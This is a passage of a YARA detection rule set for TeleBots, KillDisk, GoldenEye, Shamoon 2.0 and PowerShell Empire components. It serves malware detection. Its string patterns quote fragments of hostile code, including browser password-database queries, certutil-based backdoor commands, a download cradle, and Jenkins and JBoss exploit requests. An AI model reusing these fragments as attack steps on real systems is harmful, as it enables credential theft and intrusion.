      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "GoogleCrashReport.dll" fullword ascii
      $s1 = "CrashErrors" fullword ascii
      $s2 = "CrashSend" fullword ascii
      $s3 = "CrashAddData" fullword ascii
      $s4 = "CrashCleanup" fullword ascii
      $s5 = "CrashInit" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and $x1 ) or ( all of them )
} 

rule TeleBots_KillDisk_2_RID2E3A : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects TeleBots malware - KillDisk"
      author = "Florian Roth"
      reference = "https://goo.gl/4if3HG"
      date = "2016-12-14 11:05:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Plug-And-Play Support Service" fullword wide
      $s2 = " /c \"echo Y|" fullword wide
      $s3 = "%d.%d.%d#%d:%d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them )
} 

rule TeleBots_IntercepterNG_RID2FAC : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects TeleBots malware - IntercepterNG"
      author = "Florian Roth"
      reference = "https://goo.gl/4if3HG"
      date = "2016-12-14 12:07:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Usage: %s iface_num\\dump [mode] [w] [-gw] [-t1 ip]" fullword ascii
      $s2 = "Target%d found: %s - [%.2X-%.2X-%.2X-%.2X-%.2X-%.2X]" fullword ascii
      $s3 = "3: passwords + files, no arp poison" fullword ascii
      $s4 = "IRC Joining Keyed Channel intercepted" fullword ascii
      $s5 = "-tX - set target ip" fullword ascii
      $s6 = "w - save session to .pcap dump" fullword ascii
      $s7 = "example: %s 1 1 -gw 192.168.1.1 -t1 192.168.1.3 -t2 192.168.1.5" fullword ascii
      $s8 = "ORACLE8 DES Authorization intercepted" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of them ) or ( 4 of them )
} 

rule TeleBots_KillDisk_1_RID2E39 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects TeleBots malware - KillDisk"
      author = "Florian Roth"
      reference = "https://goo.gl/4if3HG"
      date = "2016-12-14 11:05:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Plug-And-Play Support Service" fullword wide
      $s2 = " /c \"echo Y|" fullword wide
      $s3 = "-set=06.12.2016#09:30 -est=1410" fullword ascii
      $s4 = "%d.%d.%d#%d:%d" fullword ascii
      $s5 = " /T /C /G " fullword wide
      $s6 = "[-] > %ls" fullword wide
      $s7 = "[+] > %ls" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 4 of them ) or ( 6 of them )
} 

rule TeleBots_CredRaptor_Password_Stealer_RID3569 : APT DEMO EXE FILE MAL T1003 T1136 {
   meta:
      description = "Detects TeleBots malware - CredRaptor Password Stealer"
      author = "Florian Roth"
      reference = "https://goo.gl/4if3HG"
      date = "2016-12-14 16:12:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1003, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\Documents and Settings\\Administrator\\Desktop\\GetPAI\\Out\\IE.pdb" fullword ascii
      $s2 = "SELECT encryptedUsername, encryptedPassword, hostname,httpRealm FROM moz_logins" fullword ascii
      $s3 = "SELECT ORIGIN_URL,USERNAME_VALUE,PASSWORD_VALUE FROM LOGINS" fullword ascii
      $s4 = ".\\PAI\\IEforXPpasswords.txt" fullword ascii
      $s5 = "\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" fullword ascii
      $s6 = "Opera old version credentials" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them ) or ( 4 of them )
} 

rule TeleBots_VBS_Backdoor_1_RID2F91 : APT DEMO FILE MAL SCRIPT T1136 {
   meta:
      description = "Detects TeleBots malware - VBS Backdoor"
      author = "Florian Roth"
      reference = "https://goo.gl/4if3HG"
      date = "2016-12-14 12:02:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, MAL, SCRIPT, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cmd = \"cmd.exe /c \" + arg + \" >\" + outfile +\" 2>&1\"" fullword ascii
      $s2 = "GetTemp = \"c:\\WINDOWS\\addins\"" fullword ascii
      $s3 = "elseif (arg0 = \"-dump\") Then" fullword ascii
      $s4 = "decode = \"certutil -decode \" + source + \" \" + dest  " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x6553 and filesize < 8KB and 1 of them ) or ( all of them )
} 

rule TeleBots_VBS_Backdoor_2_RID2F92 : APT DEMO FILE MAL SCRIPT T1136 {
   meta:
      description = "Detects TeleBots malware - VBS Backdoor"
      author = "Florian Roth"
      reference = "https://goo.gl/4if3HG"
      date = "2016-12-14 12:02:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, MAL, SCRIPT, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cmd = \"cmd.exe /c \" + arg + \" \" + arg2" fullword ascii
      $s2 = "Dim WMI:  Set WMI = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" fullword ascii
      $s3 = "cmd = \"certutil -encode -f \" + source + \" \" + dest" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x6944 and filesize < 30KB and 1 of them ) or ( 2 of them )
} 

rule TeleBots_Win64_Spy_KeyLogger_G_RID3253 : APT DEMO EXE FILE T1056 T1136 {
   meta:
      description = "Detects TeleBots malware - Win64 Spy KeyLogger G"
      author = "Florian Roth"
      reference = "https://goo.gl/4if3HG"
      date = "2016-12-14 14:00:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1056, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\WRK\\GHook\\gHook\\x64\\Debug\\gHookx64.pdb" fullword ascii
      $s2 = "Install hooks error!" fullword wide
      $s4 = "%ls%d.~tmp" fullword wide
      $s5 = "[*]Window PID > %d: " fullword wide
      $s6 = "Install hooks ok!" fullword wide
      $s7 = "[!]Clipboard paste" fullword wide
      $s9 = "[*] IMAGE : %ls" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them ) or ( 3 of them )
} 

rule GoldenEyeRansomware_Dropper_MalformedZoomit_RID385F : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Dropped Executable - "
      author = "Florian Roth"
      reference = "https://goo.gl/jp2SkT"
      date = "2016-12-06 18:18:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ZoomIt - Sysinternals: www.sysinternals.com" fullword ascii
      $n1 = "Mark Russinovich" wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 800KB and $s1 and not $n1 )
} 

rule GoldenEye_Ransomware_XLS_RID3061 : CRIME DEMO FILE MAL T1136 T1193 T1203 {
   meta:
      description = "GoldenEye XLS with Macro - file Schneider-Bewerbung.xls"
      author = "Florian Roth"
      reference = "https://goo.gl/jp2SkT"
      date = "2016-12-06 12:37:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CRIME, DEMO, FILE, MAL, T1136, T1193, T1203"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "fso.GetTempName();tmp_path = tmp_path.replace('.tmp', '.exe')" fullword ascii
      $x2 = "var shell = new ActiveXObject('WScript.Shell');shell.run(t'" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xcfd0 and filesize < 4000KB and 1 of them )
} 

rule SysInternals_Tool_Anomaly_RID312D : ANOMALY DEMO EXE FILE T1136 {
   meta:
      description = "SysInternals Tool Anomaly - does not contain Mark Russinovich as author"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-12-06 13:11:21"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "ANOMALY, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Software\\Sysinternals\\%s" fullword ascii
      $n1 = "Mark Russinovich" wide ascii
      $nfp1 = "<<<Obsolete>>>" fullword wide
      $nfp2 = "BGInfo - Wallpaper text configurator" wide
      $nfp3 = "usage: movefile [source] [dest]" wide
      $nfp4 = "LoadOrder information has been copied" wide
      $nfp5 = "Cache working set cleared" wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and $s1 and not $n1 and not 1 of ( $nfp* ) )
} 

rule Shamoon2_Wiper_RID2C7E : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects Shamoon 2.0 Wiper Component"
      author = "Florian Roth"
      reference = "https://goo.gl/jKIfGB"
      date = "2016-12-01 09:51:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "\\??\\%s\\System32\\%s.exe" fullword wide
      $x1 = "IWHBWWHVCIDBRAFUASIIWURRTWRTIBIVJDGWTRRREFDEAEBIAEBJGGCSVUHGVJUHADIEWAFGWADRUWDTJBHTSITDVVBCIDCWHRHVTDVCDESTHWSUAEHGTWTJWFIRTBRB" wide
      $s1 = "UFWYNYNTS" fullword wide
      $s2 = "\\\\?\\ElRawDisk" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them ) or ( 3 of them )
} 

rule Shamoon2_ComComp_RID2D25 : APT DEMO EXE FILE T1083 T1136 {
   meta:
      description = "Detects Shamoon 2.0 Communication Components"
      author = "Florian Roth"
      reference = "https://goo.gl/jKIfGB"
      date = "2016-12-01 10:19:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1083, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "mkdir %s%s > nul 2>&1" fullword ascii
      $s2 = "p[%s%s%d.%s" fullword ascii
      $op1 = { 04 32 cb 88 04 37 88 4c 37 01 88 54 37 02 83 c6 } 
      $op2 = { c8 02 d2 c0 e9 06 02 d2 24 3f 02 d1 88 45 fb 8d } 
      $op3 = { 0c 3b 40 8d 4e 01 47 3b c1 7c d8 83 fe 03 7d 1c } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( all of ( $s* ) or all of ( $op* ) )
} 

rule EldoS_RawDisk_RID2BFC : APT DEMO EXE FILE T1136 {
   meta:
      description = "EldoS Rawdisk Device Driver (Commercial raw disk access driver - used in Operation Shamoon 2.0)"
      author = "Florian Roth"
      reference = "https://goo.gl/jKIfGB"
      date = "2016-12-01 09:29:51"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "g\\system32\\" fullword wide
      $s2 = "ztvttw" fullword wide
      $s3 = "lwizvm" fullword ascii
      $s4 = "FEJIKC" fullword ascii
      $s5 = "INZQND" fullword ascii
      $s6 = "IUTLOM" fullword wide
      $s7 = "DKFKCK" fullword ascii
      $op1 = { 94 35 77 73 03 40 eb e9 } 
      $op2 = { 80 7c 41 01 00 74 0a 3d } 
      $op3 = { 74 0a 3d 00 94 35 77 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 4 of them )
} 

rule RawDisk_Driver_RID2C91 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects ElRawDisk Driver"
      author = "Florian Roth"
      reference = "https://goo.gl/jKIfGB"
      date = "2016-12-01 09:54:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "\\#{9A6DB7D2-FECF-41ff-9A92-6EDA696613DF}#" wide
      $a2 = "\\#{8A6DB7D2-FECF-41ff-9A92-6EDA696613DE}#" wide
      $s1 = "\\amd64\\elrawdsk.pdb" fullword ascii
      $s2 = "RawDiskSample.exe" fullword wide
      $s3 = "RawDisk Driver. Allows write access to files and raw disk sectors for user mode applications in Windows 2000 and later." fullword wide
      $s4 = "elrawdsk.sys" fullword wide
      $s5 = "\\DosDevices\\ElRawDisk" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and 1 of ( $a* ) and 1 of ( $s* ) )
} 

rule Empire_Invoke_MetasploitPayload_RID3389 : DEMO FILE SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file Invoke-MetasploitPayload.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 14:52:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$ProcessInfo.Arguments=\"-nop -c $DownloadCradle\"" fullword ascii
      $s2 = "$PowershellExe=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 9KB and 1 of them ) or all of them
} 

rule Empire_Exploit_Jenkins_RID2FE8 : DEMO FILE SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file Exploit-Jenkins.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 12:17:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$postdata=\"script=println+new+ProcessBuilder%28%27\"+$($Cmd)+\"" ascii
      $s2 = "$url = \"http://\"+$($Rhost)+\":\"+$($Port)+\"/script\"" fullword ascii
      $s3 = "$Cmd = [System.Web.HttpUtility]::UrlEncode($Cmd)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x6620 and filesize < 7KB and 1 of them ) or all of them
} 

rule Empire_Get_SecurityPackages_RID31C8 : DEMO FILE SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file Get-SecurityPackages.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 13:37:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$null = $EnumBuilder.DefineLiteral('LOGON', 0x2000)" fullword ascii
      $s2 = "$EnumBuilder = $ModuleBuilder.DefineEnum('SSPI.SECPKG_FLAG', 'Public', [Int32])" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 20KB and 1 of them ) or all of them
} 

rule Empire_Invoke_PowerDump_RID3040 : DEMO FILE SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file Invoke-PowerDump.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 12:31:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x16 = "$enc = Get-PostHashdumpScript" fullword ascii
      $x19 = "$lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;" fullword ascii
      $x20 = "$rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2023 and filesize < 60KB and 1 of them ) or all of them
} 

rule Empire_Install_SSP_RID2DFE : DEMO FILE SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file Install-SSP.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 10:55:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Install-SSP -Path .\\mimilib.dll" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 20KB and 1 of them ) or all of them
} 

rule Empire_Invoke_ShellcodeMSIL_RID3165 : DEMO FILE SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file Invoke-ShellcodeMSIL.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 13:20:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$FinalShellcode.Length" fullword ascii
      $s2 = "@(0x60,0xE8,0x04,0,0,0,0x61,0x31,0xC0,0xC3)" fullword ascii
      $s3 = "@(0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57," fullword ascii
      $s4 = "$TargetMethod.Invoke($null, @(0x11112222)) | Out-Null" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
} 

rule HKTL_Empire_PowerUp_RID2E36 : DEMO FILE HKTL SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file PowerUp.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 11:04:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x2 = "$PoolPasswordCmd = 'c:\\windows\\system32\\inetsrv\\appcmd.exe list apppool" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x233c and filesize < 2000KB and 1 of them ) or all of them
} 

rule Empire_Get_GPPPassword_RID2F8B : DEMO FILE SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file Get-GPPPassword.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 12:01:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$Base64Decoded = [Convert]::FromBase64String($Cpassword)" fullword ascii
      $s2 = "$XMlFiles += Get-ChildItem -Path \"\\\\$DomainController\\SYSVOL\" -Recurse" ascii
      $s3 = "function Get-DecryptedCpassword {" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
} 

rule Empire_Invoke_SmbScanner_RID3089 : DEMO FILE SCRIPT T1018 T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file Invoke-SmbScanner.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 12:44:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1018, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$up = Test-Connection -count 1 -Quiet -ComputerName $Computer " fullword ascii
      $s2 = "$out | add-member Noteproperty 'Password' $Password" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 10KB and 1 of them ) or all of them
} 

rule Empire_Exploit_JBoss_RID2EF7 : DEMO FILE SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file Exploit-JBoss.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 11:37:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Exploit-JBoss" fullword ascii
      $s2 = "$URL = \"http$($SSL)://\" + $($Rhost) + ':' + $($Port)" ascii
      $s3 = "\"/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service" ascii
      $s4 = "http://blog.rvrsh3ll.net" fullword ascii
      $s5 = "Remote URL to your own WARFile to deploy." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 10KB and 1 of them ) or all of them
} 

rule Empire_dumpCredStore_RID2F13 : DEMO FILE SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file dumpCredStore.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 11:41:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[DllImport(\"Advapi32.dll\", SetLastError = true, EntryPoint = \"CredReadW\"" ascii
      $s12 = "[String] $Msg = \"Failed to enumerate credentials store for user '$Env:UserName'\"" fullword ascii
      $s15 = "Rtn = CredRead(\"Target\", CRED_TYPE.GENERIC, out Cred);" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x233c and filesize < 40KB and 1 of them ) or all of them
} 

rule Empire_Invoke_EgressCheck_RID30E4 : DEMO FILE SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file Invoke-EgressCheck.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 12:59:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "egress -ip $ip -port $c -delay $delay -protocol $protocol" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x233c and filesize < 10KB and 1 of them ) or all of them
} 

rule Empire_ReflectivePick_x64_orig_RID32B3 : DEMO EXE FILE SCRIPT T1064 T1136 {
   meta:
      description = "Detects Empire component - file ReflectivePick_x64_orig.dll"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 14:16:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, SCRIPT, T1064, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\PowerShellRunner.pdb" fullword ascii
      $s2 = "PowerShellRunner.dll" fullword wide
      $s3 = "ReflectivePick_x64.dll" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them ) or all of them
} 

rule Empire_Out_Minidump_RID2EAC : DEMO FILE SCRIPT T1003_001 T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file Out-Minidump.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 11:24:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1003_001, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle," fullword ascii
      $s2 = "$ProcessFileName = \"$($ProcessName)_$($ProcessId).dmp\"" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 10KB and 1 of them ) or all of them
} 

rule Empire_Invoke_PsExec_RID2EE5 : DEMO FILE SCRIPT T1035 T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file Invoke-PsExec.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 11:34:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1035, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Invoke-PsExecCmd" fullword ascii
      $s2 = "\"[*] Executing service .EXE" fullword ascii
      $s3 = "$cmd = \"%COMSPEC% /C echo $Command ^> %systemroot%\\Temp\\" ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 50KB and 1 of them ) or all of them
} 

rule Empire_Invoke_PostExfil_RID303B : DEMO FILE SCRIPT T1020 T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file Invoke-PostExfil.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 12:31:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1020, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "# upload to a specified exfil URI" fullword ascii
      $s2 = "Server path to exfil to." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x490a and filesize < 2KB and 1 of them ) or all of them
} 

rule Empire_Invoke_SMBAutoBrute_RID311A : DEMO FILE SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file Invoke-SMBAutoBrute.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 13:08:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[*] PDC: LAB-2008-DC1.lab.com" fullword ascii
      $s2 = "$attempts = Get-UserBadPwdCount $userid $dcs" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
} 

rule Empire_Get_Keystrokes_RID2F85 : DEMO FILE SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file Get-Keystrokes.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 12:00:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
} 

rule Empire_Invoke_DllInjection_RID315C : DEMO FILE SCRIPT T1055 T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file Invoke-DllInjection.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 13:19:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1055, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "-Dll evil.dll" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 40KB and 1 of them ) or all of them
} 

rule Empire_KeePassConfig_RID2ED4 : DEMO FILE SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file KeePassConfig.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 11:31:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$UserMasterKeyFiles = @(, $(Get-ChildItem -Path $UserMasterKeyFolder -Force | Select-Object -ExpandProperty FullName) )" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7223 and filesize < 80KB and 1 of them ) or all of them
} 

rule Empire_Invoke_SSHCommand_RID304A : DEMO FILE SCRIPT T1021 T1064 T1086 T1136 {
   meta:
      description = "Detects Empire component - file Invoke-SSHCommand.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05 12:33:31"
      score = 75
      customer = "demo"
